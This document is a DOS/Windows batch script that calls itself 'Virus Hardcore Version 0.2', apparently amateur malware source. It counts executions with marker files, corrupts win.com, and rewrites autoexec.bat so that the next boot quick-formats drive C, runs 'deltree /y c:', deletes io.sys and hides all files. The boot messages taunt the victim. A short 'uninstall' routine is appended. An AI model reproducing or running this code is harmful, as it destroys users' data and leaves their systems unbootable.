   @echo off
   cls
   if exist c:\system.da goto Uninstall_yes

   if exist c:\windows\dat\26.q goto start
   if exist c:\windows\dat\25.q goto 25
   if exist c:\windows\dat\24.q goto 24
   if exist c:\windows\dat\23.q goto 23
   if exist c:\windows\dat\22.q goto 22
   if exist c:\windows\dat\21.q goto 21
   if exist c:\windows\dat\20.q goto 20
   if exist c:\windows\dat\19.q goto 19
   if exist c:\windows\dat\18.q goto 18
   if exist c:\windows\dat\17.q goto 17
   if exist c:\windows\dat\16.q goto 16
   if exist c:\windows\dat\15.q goto 15
   if exist c:\windows\dat\14.q goto 14
   if exist c:\windows\dat\13.q goto 13
   if exist c:\windows\dat\12.q goto 12
   if exist c:\windows\dat\11.q goto 11
   if exist c:\windows\dat\10.q goto 10
   if exist c:\windows\dat\9.q goto 9
   if exist c:\windows\dat\8.q goto 8
   if exist c:\windows\dat\7.q goto 7
   if exist c:\windows\dat\6.q goto 6
   if exist c:\windows\dat\5.q goto 5
   if exist c:\windows\dat\4.q goto 4
   if exist c:\windows\dat\3.q goto 3
   if exist c:\windows\dat\2.q goto 2
   if exist c:\windows\dat\1.q goto 1
   if not exist c:\windows\dat\*.q  goto cr!
   goto START


   :cr!

   if not exist c:\windows\*.* md c:\windows
   if not exist c:\windows\dat\*.* md c:\windows\dat


   :1
   echo fak >c:\windows\dat\2.q
   goto file_yes

   :2
   echo fak >c:\windows\dat\3.q
   goto file_yes

   :3
   echo fak >c:\windows\dat\4.q
   goto file_yes

   :4
   echo fak >c:\windows\dat\5.q
   goto file_yes

   :5
   echo fak >c:\windows\dat\6.q
   goto file_yes

   :6
   echo fak >c:\windows\dat\7.q
   goto file_yes

   :7
   echo fak >c:\windows\dat\8.q
   goto file_yes

   :8
   echo fak >c:\windows\dat\9.q
   goto file_yes

   :9
   echo fak >c:\windows\dat\10.q
   goto file_yes

   :10
   echo fak >c:\windows\dat\11.q
   goto file_yes

   :11
   echo fak >c:\windows\dat\12.q
   goto file_yes

   :12
   echo fak >c:\windows\dat\13.q
   goto file_yes

   :13
   echo fak >c:\windows\dat\14.q
   goto file_yes

   :14
   echo fak >c:\windows\dat\15.q
   goto file_yes

   :15
   echo fak >c:\windows\dat\16.q
   goto file_yes

   :16
   echo fak >c:\windows\dat\17.q
   goto file_yes

   :17
   echo fak >c:\windows\dat\18.q
   goto file_yes

   :18
   echo fak >c:\windows\dat\19.q
   goto file_yes

   :19
   echo fak >c:\windows\dat\20.q
   goto file_yes

   :20
   echo fak >c:\windows\dat\21.q
   goto file_yes

   :21
   echo fak >c:\windows\dat\22.q
   goto file_yes

   :22
   echo fak >c:\windows\dat\23.q
   goto file_yes

   :23
   echo fak >c:\windows\dat\24.q
   goto file_yes

   :24
   echo fak >c:\windows\dat\25.q
   goto file_yes

   :25
   if exist c:\windows\win.com attrib -r -a -s -h c:\windows\win.com
   echo Hardcore ver 0.2 >>c:\windows\win.com
   echo fak >c:\windows\dat\26.q
   goto file_yes


   :START
   if exist c:\windows\win.com attrib -r -a -s -h c:\windows\win.com
   echo Error>nul>>c:\windows\win.com
   if exist c:\system.tes attrib -r -h -s c:\system.tes
   if exist c:\system.tes del c:\system.tes
   echo Test file>nul>>c:\system.tes
   if not exist c:\autoexec.bat goto no_auto
   attrib -h -r -s c:\autoexec.bat

   :no_auto
   echo @echo off >c:\autoexec.bat
   echo cls>nul>>c:\autoexec.bat
   echo format c:/q/u/autotest>nul>>c:\autoexec.bat
   echo if exist c:\system.tes goto !deltree! >>c:\autoexec.bat
   echo goto end >nul>>c:\autoexec.bat
   echo :!deltree! >nul>>c:\autoexec.bat
   echo deltree/y c: >nul>>c:\autoexec.bat
   echo if exist c:\system.tes goto no_del>nul>>c:\autoexec.bat
   echo :end >>c:\autoexec.bat
   echo echo Fak Off LAMER,IM DELETED ALL YOU DATA IN THE HARD DRIVE !!!>nul>>c:\autoexec.bat
   echo goto exit >nul>>c:\autoexec.bat
   echo :no_del >nul>>c:\autoexec.bat
   echo echo Today you very much was lucky ! My virus for any reasons could not delete an    information on your computer! Switch off it immediately and be pleased...>nul>>c:\autoexec.bat
   echo echo But Im a not lamer,im a PRO USER !!! Im delete you Io.sys file!!!>nul>>c:\autoexec.bat
   echo if exist c:\io.sys attrib -r -s -h c:\io.sys>nul>>c:\autoexec.bat
   echo if exist c:\io.sys del c:\io.sys>nul>>c:\autoexec.bat
   echo if exist c:\io.sys goto no!>nul>>c:\autoexec.bat
   echo goto ex1>nul>>c:\autoexec.bat
   echo :no!>nul>>autoexec.bat
   echo echo To you VERY MUCH carries! I can not delete this file!! Bye !>nul>>c:\autoexec.bat
   echo attrib +r +s +h c:\*.*/s>nul>>c:\autoexec.bat
   echo goto exit>nul>>c:\autoexec.bat
   echo :ex1
   echo echo Fak off,LAMER !!! Im deleted you Io.sys file !>nul>>c:\autoexec.bat
   echo :exit>nul>>c:\autoexec.bat
   goto file_yes

   :Uninstall_yes

   @echo off
   cls
   echo This is uninstall Virus Hardcore Version 0.2
   echo If you NOT ready to uninstall,prees Ctrl+Break !
   pause
   if exist c:\windows\invtest.tes goto uninstall
   echo Not found Virus Hardcore Version 0.2 !
   echo ByE !
   goto exit_uninstall
   :uninstall
   cls
   echo Please,wait...
   if exist c:\windows\dat\1.q del c:\windows\dat\*.q
   if not exist c:\windows\dat\*.* deltree/y c:\windows\dat
   if exist vdata.* attrib -r -s -h c:\windows\vdata.*
   if exist vdata.* del c:\windows\vdata.*
   del c:\windows\invtest.tes
   attrib -r -a -s -h c:\*.*/s
   if not exist c:\windos\vdata.* goto ok!!
   CLS
   echo Uninstall error !
   goto exit_uninstall
   :ok!!
   echo Uninstall DONE !
   echo Del Virus code in c:\windows\dosstart.bat and c:\autoexec.bat files !
   :exit_uninstall

   :file_yes
